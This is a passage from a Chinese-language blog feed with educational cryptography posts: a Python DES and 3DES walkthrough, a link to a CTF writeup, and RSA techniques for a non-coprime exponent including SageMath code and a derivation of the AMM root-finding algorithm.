<span class="built_in">print</span>(<span class="string">&#x27;当前二进制形式密钥为:&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(self.K))</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;当前字符串形式密钥为：&#123;&#125;&quot;</span>.<span class="built_in">format</span>(self.bin2str(self.K)))</span><br><span class="line">        newkey = <span class="built_in">input</span>(<span class="string">&quot;输入新的密钥（长度为8）：&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(newkey) != <span class="number">8</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;密钥长度不符合，请重新输入：&quot;</span>)</span><br><span class="line">            self.modify_secretkey()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            bin_key = self.str2bin(newkey)</span><br><span class="line">            self.K = bin_key</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;当前二进制形式密钥为:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(self.K))</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__f_funtion</span>(<span class="params">self, right: <span class="built_in">str</span>, key: <span class="built_in">str</span></span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        :param right: 明文二进制的字符串加密过程的右半段</span></span><br><span class="line"><span class="string">        :param key: 当前轮数的密钥</span></span><br><span class="line"><span class="string">        :return: 进行E扩展，与key异或操作，S盒操作后返回32位01字符串</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="comment"># 对right进行E扩展</span></span><br><span class="line">        e_result = self.__substitution(right, self.E)</span><br><span class="line">        <span class="comment"># 与key 进行异或操作</span></span><br><span class="line">        xor_result = self.__xor_function(e_result, key)</span><br><span class="line">        <span class="comment"># 进入S盒子</span></span><br><span class="line">        s_result = self.__s_box(xor_result)</span><br><span class="line">        <span class="comment"># 进行P置换</span></span><br><span class="line">        p_result = self.__substitution(s_result, self.P)</span><br><span class="line">        <span class="keyword">return</span> p_result</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__get_key_list</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        :return: 返回加密过程中16轮的子密钥</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        key = self.__substitution(self.K, self.k1)</span><br><span class="line">        left_key = key[<span class="number">0</span>:<span class="number">28</span>]</span><br><span class="line">        right_key = key[<span class="number">28</span>:<span class="number">56</span>]</span><br><span class="line">        keys = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">17</span>):</span><br><span class="line">            move = self.k0[i - <span class="number">1</span>]</span><br><span class="line">            move_left = left_key[move:<span class="number">28</span>] + left_key[<span class="number">0</span>:move]</span><br><span class="line">            move_right = right_key[move:<span class="number">28</span>] + right_key[<span class="number">0</span>:move]</span><br><span class="line">            left_key = move_left</span><br><span class="line">            right_key = move_right</span><br><span class="line">            move_key = left_key + right_key</span><br><span class="line">            ki = self.__substitution(move_key, self.k2)</span><br><span class="line">            keys.append(ki)</span><br><span class="line">        <span class="keyword">return</span> keys</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__xor_function</span>(<span class="params">self, xor1: <span class="built_in">str</span>, xor2: <span class="built_in">str</span></span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        :param xor1: 01字符串</span></span><br><span class="line"><span class="string">        :param xor2: 01字符串</span></span><br><span class="line"><span class="string">        :return: 异或操作返回的结果</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        size = <span class="built_in">len</span>(xor1)</span><br><span class="line">        result = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, size):</span><br><span class="line">            result += <span class="string">&#x27;0&#x27;</span> <span class="keyword">if</span> xor1[i] == xor2[i] <span class="keyword">else</span> <span class="string">&#x27;1&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__s_box</span>(<span class="params">self, xor_result: <span class="built_in">str</span></span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        :param xor_result: 48位01字符串</span></span><br><span class="line"><span class="string">        :return: 返回32位01字符串</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        result = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">8</span>):</span><br><span class="line">            <span class="comment"># 将48位数据分为6组，循环进行</span></span><br><span class="line">            block = xor_result[i * <span class="number">6</span>:(i + <span class="number">1</span>) * <span class="number">6</span>]</span><br><span class="line">            line = <span class="built_in">int</span>(block[<span class="number">0</span>] + block[<span class="number">5</span>], <span class="number">2</span>)</span><br><span class="line">            colmn = <span class="built_in">int</span>(block[<span class="number">1</span>:<span class="number">4</span>], <span class="number">2</span>)</span><br><span class="line">            res = <span class="built_in">bin</span>(self.S[i][line*<span class="number">16</span> + colmn])[<span class="number">2</span>:]</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(res) &lt; <span class="number">4</span>:</span><br><span class="line">                res = <span class="string">&#x27;0&#x27;</span> * (<span class="number">4</span> - <span class="built_in">len</span>(res)) + res</span><br><span class="line">            result += res</span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__iteration</span>(<span class="params">self, bin_plaintext: <span class="built_in">str</span>, key_list: <span class="built_in">list</span></span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        :param bin_plaintext: 01字符串，64位</span></span><br><span class="line"><span class="string">        :param key_list: 密钥列表，共16个</span></span><br><span class="line"><span class="string">        :return: 进行F函数以及和left异或操作之后的字符串</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        left = bin_plaintext[<span class="number">0</span>:<span class="number">32</span>]</span><br><span class="line">        right = bin_plaintext[<span class="number">32</span>:<span class="number">64</span>]</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">16</span>):</span><br><span class="line">            next_lift = right</span><br><span class="line">            f_result = self.__f_funtion(right, key_list[i])</span><br><span class="line">            next_right = self.__xor_function(left, f_result)</span><br><span class="line">            left = next_lift</span><br><span class="line">            right = next_right</span><br><span class="line">        bin_plaintext_result = left + right</span><br><span class="line">        <span class="keyword">return</span> bin_plaintext_result[<span class="number">32</span>:] + bin_plaintext_result[:<span class="number">32</span>]</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">encode</span>(<span class="params">self, plaintext</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        :param plaintext: 明文字符串</span></span><br><span class="line"><span class="string">        :return: 密文字符串</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        bin_plaintext = self.str2bin(plaintext)</span><br><span class="line">        bin_plaintext_block = self.__get_block_list(bin_plaintext)</span><br><span class="line">        ciphertext_bin_list = []</span><br><span class="line">        key_list = self.__get_key_list()</span><br><span class="line">        <span class="keyword">for</span> block <span class="keyword">in</span> bin_plaintext_block:</span><br><span class="line">            <span class="comment"># 初代ip置换</span></span><br><span class="line">            sub_ip = self.__substitution(block, self.ip)</span><br><span class="line">            ite_result = self.__iteration(sub_ip, key_list)</span><br><span class="line">            <span class="comment"># 逆ip置换</span></span><br><span class="line">            sub_ip1 = self.__substitution(ite_result, self.ip1)</span><br><span class="line">            ciphertext_bin_list.append(sub_ip1)</span><br><span class="line">        ciphertext_bin = <span class="string">&#x27;&#x27;</span>.join(ciphertext_bin_list)</span><br><span class="line">        result = self.__bin2int(ciphertext_bin)</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">bytes</span>(result).<span class="built_in">hex</span>().upper()</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">decode</span>(<span class="params">self, ciphertext</span>):</span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        :param ciphertext: 密文字符串</span></span><br><span class="line"><span class="string">        :return: 明文字符串</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">        b_ciphertext = binascii.a2b_hex(ciphertext)</span><br><span class="line">        bin_ciphertext = self.__int2bin(<span class="built_in">list</span>(b_ciphertext))</span><br><span class="line">        bin_plaintext_list = []</span><br><span class="line">        key_list = self.__get_key_list()</span><br><span class="line">        key_list = key_list[::-<span class="number">1</span>]</span><br><span class="line">        bin_ciphertext_block = [bin_ciphertext[i:i + <span class="number">64</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(bin_ciphertext), <span class="number">64</span>)]</span><br><span class="line">        <span class="keyword">for</span> block <span class="keyword">in</span> bin_ciphertext_block:</span><br><span class="line">            sub_ip = self.__substitution(block, self.ip)</span><br><span class="line">            ite = self.__iteration(sub_ip, key_list)</span><br><span class="line">            sub_ip1 = self.__substitution(ite, self.ip1)</span><br><span class="line">            bin_plaintext_list.append(sub_ip1)</span><br><span class="line">        bin_plaintext = <span class="string">&#x27;&#x27;</span>.join(bin_plaintext_list).replace(<span class="string">&#x27;00000000&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> self.bin2str(bin_plaintext)</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">main</span>(<span class="params">self</span>):</span><br><span class="line">        select = <span class="built_in">input</span>(<span class="string">&quot;Please selecting:\n1、Encryption\t 2、Decrpytion\nYour selecting:&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> select == <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">            plaintext = <span class="built_in">input</span>(<span class="string">&quot;Input plaintext：&quot;</span>)</span><br><span class="line">            <span class="comment"># print(&quot;Your plaintext is:&#123;&#125;&quot;.format(plaintext))</span></span><br><span class="line">            ciphertext = self.encode(plaintext)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;The ciphertext is:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(ciphertext))</span><br><span class="line">        <span class="keyword">elif</span> select == <span class="string">&#x27;2&#x27;</span>:</span><br><span class="line">            plaintext = <span class="built_in">input</span>(<span class="string">&quot;Input ciphertext：&quot;</span>)</span><br><span class="line">            <span class="comment"># print(&quot;Your ciphertext is:&#123;&#125;&quot;.format(plaintext))</span></span><br><span class="line">            plaintext = self.decode(plaintext)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;The plaintext is:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(plaintext))</span><br><span class="line">            <span class="comment"># print(len(plaintext))</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">input</span>(<span class="string">&quot;Please selecting again！&quot;</span>)</span><br><span class="line">            self.main()</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    mydes = ArrangeSimpleDES()</span><br><span class="line">    mydes.modify_secretkey()</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        mydes.main()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure><p>另外要说的是，python也有模块可以直接进行des的加解密，但是真要考DES多半不会直接用这个就能出。。。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">from Crypto.Cipher import DES</span><br><span class="line">message = b&#x27;&#x27;</span><br><span class="line">key = b&#x27;&#x27;</span><br><span class="line">cipher = DES.new(key, DES.MODE_ECB) #这里使用了ECB模式</span><br><span class="line">ciphertext = cipher.encrypt(message) #加密</span><br><span class="line">print(ciphertext)</span><br><span class="line">plain = cipher.decrypt(ciphertext) #解密</span><br><span class="line">print(plain)</span><br></pre></td></tr></table></figure><h2 id="3DES"><a href="#3DES" class="headerlink" title="3DES"></a>3DES</h2><p>由于DES的实际密钥长度只有56位，安全性并不高，于是便有了3DES，可以说是对明文进行了3次DES，因此密钥有168位。</p><p>流程如下（图来源<a href="https://blog.csdn.net/qq_41137136/article/details/86416849">这篇文章</a>）</p><h3 id="DES-EDE3"><a href="#DES-EDE3" class="headerlink" title="DES-EDE3"></a>DES-EDE3</h3><p>三个密钥都不同时</p><p><img src="/images/DES%E5%8A%A0%E5%AF%86/2019011314264658.png" alt="2019011314264658"></p><h3 id="DES-EDE2"><a href="#DES-EDE2" class="headerlink" title="DES-EDE2"></a>DES-EDE2</h3><p>当密钥1、3相同，密钥2不同时</p><p><img src="/images/DES%E5%8A%A0%E5%AF%86/20190113142411607.png" alt="20190113142411607"></p><p>当三个密钥都相同时，就成了普通的DES</p><h2 id="关于DES的攻击"><a href="#关于DES的攻击" class="headerlink" title="关于DES的攻击"></a>关于DES的攻击</h2><blockquote><p>这里有待补充</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Academic </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Crypto </tag>
            
            <tag> Academic </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HSCCTF2024 Writeup</title>
      <link href="/2024/03/10/HSCCTF2024-Writeup/"/>
      <url>/2024/03/10/HSCCTF2024-Writeup/</url>
      
        <content type="html"><![CDATA[<h4 id="Writeup"><a href="#Writeup" class="headerlink" title="Writeup"></a><a href="https://www.blog.st4rr.top/writeups/HSCCTF2024Writeup.pdf">Writeup</a></h4>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> CTF </tag>
            
            <tag> HSCCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>密码学算法散记</title>
      <link href="/2024/03/07/%E5%AF%86%E7%A0%81%E5%AD%A6%E7%AE%97%E6%B3%95%E6%95%A3%E8%AE%B0/"/>
      <url>/2024/03/07/%E5%AF%86%E7%A0%81%E5%AD%A6%E7%AE%97%E6%B3%95%E6%95%A3%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<blockquote><p>在这里零散地记载一些密码学可能用到的算法脚本<del>（当裁缝）</del>，方便之后直接拿来用</p></blockquote><h2 id="RSA中的e-phi不互素问题"><a href="#RSA中的e-phi不互素问题" class="headerlink" title="RSA中的e,phi不互素问题"></a>RSA中的e,phi不互素问题</h2><p>参考了<a href="https://blog.csdn.net/m0_74345946/article/details/133936371">这篇文章</a></p><h3 id="换模"><a href="#换模" class="headerlink" title="换模"></a>换模</h3><p>当e和p-1或q-1互素时，可以转换到模p或模q下求解</p><p>假设e与p-1互素<br>$$<br>m^e\equiv c(mod\ n)<br>$$</p><p>$$<br>m^e&#x3D;c+kpq<br>$$</p><p>$$<br>m^e\ mod\ p&#x3D;c\ mod\ p+kpq\ mod\ p<br>$$</p><p>$$<br>m^e\equiv c(mod\ p)<br>$$</p><p>python实现：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">e=</span><br><span class="line">p=</span><br><span class="line">q=</span><br><span class="line">n=</span><br><span class="line">c=</span><br><span class="line"><span class="keyword">assert</span> gmpy2.gcd(e,p-<span class="number">1</span>)==<span class="number">1</span></span><br><span class="line">c=c%p</span><br><span class="line">phi=p-<span class="number">1</span></span><br><span class="line">d=gmpy2.invert(e,phi)</span><br><span class="line">m=<span class="built_in">pow</span>(c,d,p)</span><br></pre></td></tr></table></figure><h3 id="e-gcd-iroot-m-2"><a href="#e-gcd-iroot-m-2" class="headerlink" title="e&#x2F;&#x2F;gcd iroot(m,2)"></a>e&#x2F;&#x2F;gcd iroot(m,2)</h3><p>当gcd(e,phi)较小时，可以先将e&#x2F;&#x2F;gcd(e,phi)，使得e和phi互素后，再对算出的m开根</p><p>python实现：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">e=</span><br><span class="line">p=</span><br><span class="line">q=</span><br><span class="line">n=</span><br><span class="line">c=</span><br><span class="line">phi=(p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">_gcd=gmpy2.gcd(e,phi)</span><br><span class="line">e=e//_gcd</span><br><span class="line">d=gmpy2.invert(e,phi)</span><br><span class="line">m=gmpy2.iroot(<span class="built_in">pow</span>(c,d,p),_gcd)[<span class="number">0</span>]</span><br></pre></td></tr></table></figure><h3 id="有限域内开方"><a href="#有限域内开方" class="headerlink" title="有限域内开方"></a>有限域内开方</h3><p>有时，当e较小时，我们仍然无法用上面的方法得到m。这时，我们可以使用有限域内开方的方法。</p><p>前面我们已经证明了，当p为素数时，由<br>$$<br>m^e\equiv c(mod\ n)<br>$$<br>可以推知<br>$$<br>m^e\equiv c(mod\ p)<br>$$<br>于是我们可以设法找到所有满足<br>$$<br>m^e\equiv x^e\equiv c(mod\ p)<br>$$<br>的x，以及所有满足<br>$$<br>m^e\equiv y^e\equiv c(mod\ q)<br>$$<br>的y，从而列出<br>$$<br>\begin{cases}m\equiv x(mod\ p) \ m\equiv y(mod\ q)\end{cases}<br>$$<br>的方程组，通过中国剩余定理（CRT）求解。</p><p>下面是一个利用sagemath的程序实现</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">p = </span><br><span class="line">q = </span><br><span class="line">c = </span><br><span class="line">e = </span><br><span class="line">n = </span><br><span class="line"></span><br><span class="line">P.&lt;a&gt;=PolynomialRing(Zmod(p),implementation=<span class="string">&#x27;NTL&#x27;</span>)</span><br><span class="line">f=a^e-c</span><br><span class="line">mps=f.monic().roots()</span><br><span class="line"></span><br><span class="line">P.&lt;a&gt;=PolynomialRing(Zmod(q),implementation=<span class="string">&#x27;NTL&#x27;</span>)</span><br><span class="line">g=a^e-c</span><br><span class="line">mqs=g.monic().roots()</span><br><span class="line"></span><br><span class="line">flag=[]</span><br><span class="line"><span class="keyword">for</span> mpp <span class="keyword">in</span> mps:</span><br><span class="line">    x=mpp[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">for</span> mqq <span class="keyword">in</span> mqs:</span><br><span class="line">        y=mqq[<span class="number">0</span>]</span><br><span class="line">        solution = CRT_list([<span class="built_in">int</span>(x), <span class="built_in">int</span>(y)], [p, q])</span><br><span class="line">        flag.append(solution)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> flag:</span><br><span class="line">    m=long_to_bytes(i)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&#x27;flag&#x27;</span><span class="keyword">in</span> m:</span><br><span class="line">        <span class="built_in">print</span>(m)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>当然也可以通过观察对算法进行一定的优化，详见上面给出的文章，这里不再赘述。</p><h3 id="AMM算法"><a href="#AMM算法" class="headerlink" title="AMM算法"></a>AMM算法</h3><p>参考了<a href="https://lov2.netlify.app/rsa_e_phi_not_coprime/">这篇文章</a></p><p>当e比较大的时候，我们可以使用AMM算法，它能够大大提高运算的速度</p><h4 id="原算法"><a href="#原算法" class="headerlink" title="原算法"></a>原算法</h4><p>先说明一下AMM算法的原算法，此时e&#x3D;2，p为奇素数，对于<br>$$<br>x^2\equiv r(mod\ p)<br>$$<br>我们先对两边开根<br>$$<br>x\equiv r^{\frac{1}{2}}(mod\ p)<br>$$<br>令p-1&#x3D;2^{s}t，又由欧拉定理得，<br>$$<br>r^{\frac{p-1}{2}}\equiv r^{2^{s-1}t}\equiv 1(mod\ p)<br>$$</p><h5 id="当s-1时，"><a href="#当s-1时，" class="headerlink" title="当s&#x3D;1时，"></a>当s&#x3D;1时，</h5><p>$$<br>r^t\equiv 1(mod\ p)<br>$$</p><p>两边同时乘r，再开根，即推出公式<br>$$<br>r^{\frac{t+1}{2}}\equiv \pm \sqrt r\equiv \pm x(mod\ p)<br>$$<br>将m和c代进去，就是这样(t可以根据p算出来)<br>$$<br>\pm m\equiv c^{\frac{t+1}{2}}<br>$$</p><h5 id="当s-1时，-1"><a href="#当s-1时，-1" class="headerlink" title="当s&gt;1时，"></a>当s&gt;1时，</h5><p>如果直接开根我们会得到一正一负两个式子<br>$$<br>r^{2^{s-2}t}\equiv 1(mod\ p)<br>$$</p><p>$$<br>r^{2^{s-2}t}\equiv -1(mod\ p)<br>$$</p><p>由上面得到的<br>$$<br>r^{2^{s-1}t}\equiv 1(mod\ p)<br>$$<br>两边同时乘上这个式子，并用k来控制是否要乘（k&#x3D;0,1）<br>$$<br>r^{2^{s-2}t}n^{2^{s-1}tk}\equiv 1(mod\ p)<br>$$<br>就这样反复对两边进行开方操作，直至回到前面s&#x3D;1的情况，即<br>$$<br>r^tn^{t*(2k_1+2^2k_2+…+2^{s-1}k_{s-1})}\equiv 1(mod\ p)<br>$$<br>两边乘上r再开方<br>$$<br>r^{\frac{t+1}{2}}n^{t*(k_1+2k_2+…+2^{s-2}k_{s-1})}\equiv\pm  \sqrt r\equiv \pm x(mod\ p)<br>$$<br>将m和c代进去，得到<br>$$<br>c^{\frac{t+1}{2}}n^{t*(k_1+2k_2+…+2^{s-2}k_{s-1})}\equiv \pm m(mod\ p)<br>$$</p><h4 id="e-2"><a href="#e-2" class="headerlink" title="e&gt;2"></a>e&gt;2</h4><p>对于<br>$$<br>x^e\equiv r(mod\ p)<br>$$<br>令p-1&#x3D;e^{s}t，则有<br>$$<br>r^{\frac{p-1}{e}}\equiv r^{e^{s-1}t}\equiv 1(mod\ p)<br>$$<br>此时可以找到δ，使得t|(eδ-1)，则<br>$$<br>r^{e^{s-1}(eδ-1)}\equiv 1(mod\ p)<br>$$</p><h5 id="当s-1时，-2"><a href="#当s-1时，-2" class="headerlink" title="当s&#x3D;1时，"></a>当s&#x3D;1时，</h5><p>$$<br>r^{(eδ-1)}\equiv 1(mod\ p)<br>$$</p><p>两边乘r，再开e次方<br>$$<br>r^\delta\equiv r^{\frac{1}{e}}\equiv x(mod\ p)<br>$$</p><h5 id="当s-1时，-3"><a href="#当s-1时，-3" class="headerlink" title="当s&gt;1时，"></a>当s&gt;1时，</h5><p>构造e次非剩余集合<br>$$<br>K_i&#x3D;\rho^{i<em>\frac{p-1}{e}}&#x3D;\rho^{i</em>e^{s-1}t},0\leq i\leq e-1<br>$$</p><p>$$<br>K_i^e&#x3D;\rho^{i<em>e^st}&#x3D;\rho^{i</em>(p-1)}<br>$$</p><p>所以根据欧拉定理，得<br>$$<br>\rho^{i*(p-1)}\equiv \rho^{(p-1)}\equiv1(mod\ p)<br>$$<br>由上面的式子又可以推知<br>$$<br>\begin{cases}K_i&#x3D;\rho^{\frac{i*(p-1)}{e}} \ K_{e-i}&#x3D;\rho^{\frac{(e-i)*(p-1)}{e}}\end{cases}<br>$$</p><p>$$<br>K_i<em>K_{e-i}&#x3D;\rho^{p-1}<br>$$<br>由欧拉定理又可以得到<br>$$<br>K_i</em>K_{e-i}\equiv 1(mod\ p)<br>$$<br>所以K_i和K_{e-i}互为逆元</p><p>对于前面这个式子<br>$$<br>r^{e^{s-1}(eδ-1)}\equiv 1(mod\ p)<br>$$<br>两边开e次方得到一个集合K中的数设为K_{e-j}<br>$$<br>r^{e^{s-2}(eδ-1)}\equiv K_{e-j}(mod\ p)<br>$$<br>两边乘上K_j然后开e次方<br>$$<br>r^{e^{s-2}(eδ-1)}K_j\equiv K_{e-j}K_j\equiv 1(mod\ p)<br>$$</p><p>$$<br>r^{e^{s-2}(eδ-1)}\rho^{j*e^{s-1}t}\equiv 1(mod\ p)<br>$$</p><p>反复进行上述操作，直至回到s&#x3D;1的情况<br>$$<br>r^{(eδ-1)}\rho^{ej_1+e^2j_2+…+e^{s-1}j_{s-1}}\equiv 1(mod\ p)<br>$$<br>两边乘r，开e次方<br>$$<br>r^δ\rho^{j_1+ej_2+…+e^{s-2}j_{s-1}}\equiv r^{\frac{1}{e}}\equiv x(mod\ p)<br>$$<br>将m和c代进去，得到<br>$$<br>c^δ\rho^{j_1+ej_2+…+e^{s-2}j_{s-1}}\equiv m(mod\ p)<br>$$<br>此时我们便得到了其中一个根，剩余的根可以通过不断乘上集合K得到.</p><p>当我们得到了所有的解以后，使用中国剩余定理对下面的方程组求解即可<br>$$<br>\begin{cases} m^e\equiv cp(mod\ p) \ m^e\equiv cq(mod\ q)\end{cases}<br>$$<br>python代码实现：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random </span><br><span class="line"><span class="keyword">import</span> time </span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> * <span class="comment"># pip install pycryptodome</span></span><br><span class="line"><span class="keyword">import</span> gmpy2 <span class="comment"># pip install gmpy2</span></span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm <span class="comment"># pip install tqdm</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">onemod</span>(<span class="params">e, q</span>):</span><br><span class="line">    p = random.randint(<span class="number">1</span>, q - <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">while</span> ((gmpy2.powmod(p, (q - <span class="number">1</span>) // e, q)) == <span class="number">1</span>):</span><br><span class="line">        p = random.randint(<span class="number">1</span>, q)</span><br><span class="line">    <span class="keyword">return</span> p</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">AMM_rth</span>(<span class="params">x, e, N</span>):</span><br><span class="line">    <span class="keyword">assert</span> ((N - <span 